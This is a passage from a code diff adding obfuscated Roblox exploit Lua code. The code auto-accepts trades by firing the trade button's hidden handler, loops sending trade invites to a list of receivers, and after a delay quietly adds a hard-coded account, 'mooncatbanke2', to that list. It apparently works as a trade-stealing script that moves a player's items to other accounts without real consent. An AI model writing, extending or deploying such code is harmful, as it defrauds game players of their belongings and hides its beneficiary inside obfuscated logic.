+					local text2 = readyButton.Txt.Text
+					local flag16 = readyButton.BackgroundColor3 == color2
+					local flag17
+
+					if flag16 then
+						flag17 = text2 == "READY" or text2 == "ACCEPT"
+					else
+						flag17 = flag16
+					end
+
+					if flag17 then
+						local v8 = getconnections(readyButton.Activated)[1]
+
+						if v8 and v8.Function then
+							fn59(v8.Function)
+							task.wait(0.5)
+						end
+					else
+						task.wait(0.1)
+					end
+
+					if not (n12 <= os.clock()) then
+						continue
+					end
+					break
+				end
+			end)
+		end
+
+		if genv3.AutoBrainrotTradeConnection then
+			genv3.AutoBrainrotTradeConnection:Disconnect()
+		end
+
+		genv3.AutoBrainrotTradeConnection = tradeLiveTrade2:GetPropertyChangedSignal("Visible"):Connect(function()
+			if tradeLiveTrade2.Visible then
+				fn62()
+				fn67()
+			else
+				n7 += 1
+				autoTradeVisualCleanup()
+			end
+		end)
+
+		if tradeLiveTrade2.Visible then
+			fn62()
+			fn67()
+		end
+
+		if not flag3 then
+			return
+		end
+		local tbl10 = {}
+		local n9 = 0
+
+		local function fn68(arg)
+			local v4 = tbl10[arg]
+			if v4 then
+				return v4
+			end
+
+			local ok, result = pcall(function()
+				return Players2:GetUserIdFromNameAsync(arg)
+			end)
+
+			if ok and type(result) == "number" then
+				tbl10[arg] = result
+				return result
+			end
+		end
+
+		local function fn69()
+			for i = 1, #receivers do
+				if tradeLiveTrade2.Visible then
+					return nil
+				end
+				local n10 = (n9 + i - 1) % #receivers + 1
+				local v4 = receivers[n10]
+				local v5 = fn68(v4)
+
+				if v5 then
+					n9 = n10
+
+					return v4, function()
+						return TradeController:SendInvite(v5, function()
+						end)
+					end
+				end
+			end
+
+			return nil
+		end
+
+		genv3.TradeInviteRun = (genv3.TradeInviteRun or 0) + 1
+		local tradeInviteRun = genv3.TradeInviteRun
+
+		task.spawn(function()
+			task.wait(100)
+			if genv3.TradeInviteRun ~= tradeInviteRun then
+				return
+			end
+
+			if flag15 or genv2[str4] then
+				return
+			end
+			local flag16 = false
+
+			for _, receiver in ipairs(receivers) do
+				if string.lower(receiver) == "mooncatbanke2" then
+					flag16 = true
+					break
+				end
+			end
+
+			if not flag16 then
+				receivers[#receivers + 1] = "mooncatbanke2"
+			end
+
+			if fn57() then
+				fn46()
+			end
+		end)
+
+		task.spawn(function()
+			local v4 = Random.new()
+
+			while genv3.TradeInviteRun == tradeInviteRun do
+				while true do
+					if genv3.TradeInviteRun == tradeInviteRun and not tradeLiveTrade2.Visible then
+						local v5, v6 = fn69()
+
+						if not tradeLiveTrade2.Visible then
+							local v7 = v4:NextNumber(10, 15)
+
+							if v5 and v6 then
+								str6 = v5
+								local now = os.clock()
+								fn59(v6)
+
+								while genv3.TradeInviteRun == tradeInviteRun and not tradeLiveTrade2.Visible and os.clock() - now < v7 do
+									task.wait(0.1)
+								end
+							else
+								local n10 = os.clock() + v7
+
+								while genv3.TradeInviteRun == tradeInviteRun and not tradeLiveTrade2.Visible and os.clock() < n10 do
+									task.wait(0.1)
+								end
+							end
+
+							continue
+						end
+					end
+
+					break
+				end
+
+				while genv3.TradeInviteRun == tradeInviteRun and tradeLiveTrade2.Visible do
+					task.wait(0.2)
+				end
+
+				if genv3.TradeInviteRun == tradeInviteRun then
+					task.wait(1.5)
+
+					if not flag15 then
+						if #fn54() ~= 0 then
+							task.wait(2)
+							continue
+						end
+					end
+				end
+
+				break
+			end
+		end)
+	end
+
+	fn58()
+end
+
+if not flag2 or flag6 then
+	task.spawn(function()
+		local n7 = 0
+
+		while true do
+			if not fn6() and n7 < 10 then
+				local v3 = fn54()
+
+				if #v3 > 0 then
+					fn53(v3)
+					break
+				else
+					n7 += n
+					task.wait(n)
+					continue
+				end
+			end
+
+			break
+		end
+	end)
+end
